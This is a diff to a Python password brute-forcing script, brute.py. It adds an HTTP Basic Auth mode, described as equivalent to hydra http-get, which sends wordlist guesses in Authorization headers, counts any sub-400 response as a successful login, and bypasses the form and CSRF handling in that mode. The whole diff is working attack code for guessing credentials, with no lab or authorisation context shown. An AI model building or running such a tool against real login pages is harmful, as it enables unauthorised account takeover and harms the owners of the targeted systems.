@@ -110,6 +110,32 @@ class Brute(object):
     def attempt(self, password):
         a = self.args
         opener = build_opener(a.insecure)
+
+        # ---- HTTP Basic Auth mode (equivalent of hydra http-get) ----
+        if a.basic_auth:
+            import base64
+            token = base64.b64encode(
+                ("%s:%s" % (a.username, password)).encode()).decode()
+            req = urllib.request.Request(
+                a.url, method="GET",
+                headers={"Authorization": "Basic " + token,
+                         "User-Agent": "Mozilla/5.0 (brute.py)",
+                         "Accept": "text/html,application/xhtml+xml"},
+            )
+            try:
+                with opener.open(req, timeout=a.timeout) as resp:
+                    body = resp.read().decode("utf-8", "replace")
+                    status, length = resp.getcode(), len(body)
+            except urllib.error.HTTPError as e:
+                body = e.read().decode("utf-8", "replace")
+                status, length = e.code, len(body)
+            except Exception as e:
+                return ("error", str(e))
+            if status < 400:            # 200/302 == auth accepted
+                return ("hit", (password, status, length,
+                                "HTTP %d, %d bytes" % (status, length)))
+            return ("miss", (password, status, length))
+
         data = {a.user_field: a.username, a.pass_field: password}
         if self.csrf_name and self.csrf_value is not None:
             data[self.csrf_name] = self.csrf_value
@@ -172,18 +198,21 @@ class Brute(object):
 
     def run(self, wordlist):
         a = self.args
-        try:
-            html, _ = fetch_login_page(build_opener(a.insecure), a.login_page, a.timeout)
-            fields = a.csrf_field or ["csrf", "csrf_token", "csrfmiddlewaretoken",
-                                      "_token", "token", "authenticity_token"]
-            got = extract_csrf(html, fields)
-            if got:
-                self.csrf_name, self.csrf_value = got
-                log("[*] CSRF token detected: %s=%s" % got)
-            else:
-                log("[*] no CSRF token in login page (proceeding without)")
-        except Exception as e:
-            log("[!] could not GET login page (%s); continuing anyway" % e)
+        if a.basic_auth:
+            log("[*] HTTP Basic Auth mode: GET %s with Authorization header" % a.url)
+        else:
+            try:
+                html, _ = fetch_login_page(build_opener(a.insecure), a.login_page, a.timeout)
+                fields = a.csrf_field or ["csrf", "csrf_token", "csrfmiddlewaretoken",
+                                          "_token", "token", "authenticity_token"]
+                got = extract_csrf(html, fields)
+                if got:
+                    self.csrf_name, self.csrf_value = got
+                    log("[*] CSRF token detected: %s=%s" % got)
+                else:
+                    log("[*] no CSRF token in login page (proceeding without)")
+            except Exception as e:
+                log("[!] could not GET login page (%s); continuing anyway" % e)
 
         q = queue.Queue()
         count = 0
@@ -223,6 +252,9 @@ def parse_args(argv):
                    help="hidden token field name(s) to look for")
     p.add_argument("--extra", action="append", default=None,
                    help="extra fixed form fields, key=value (repeatable)")
+    p.add_argument("--basic-auth", action="store_true",
+                   help="HTTP Basic Auth mode: GET with Authorization header "
+                        "(equivalent of hydra http-get; no form fields)")
     p.add_argument("--threads", type=int, default=20)
     p.add_argument("--timeout", type=float, default=10.0)
     p.add_argument("--progress", type=int, default=200,
@@ -237,7 +269,7 @@ def parse_args(argv):
 
 def main(argv=None):
     args = parse_args(argv if argv is not None else sys.argv[1:])
-    if not args.fail and not args.success:
+    if not args.basic_auth and not args.fail and not args.success:
         log("[!] WARNING: neither --fail nor --success given; every response is a miss.")
     b = Brute(args)
     try:
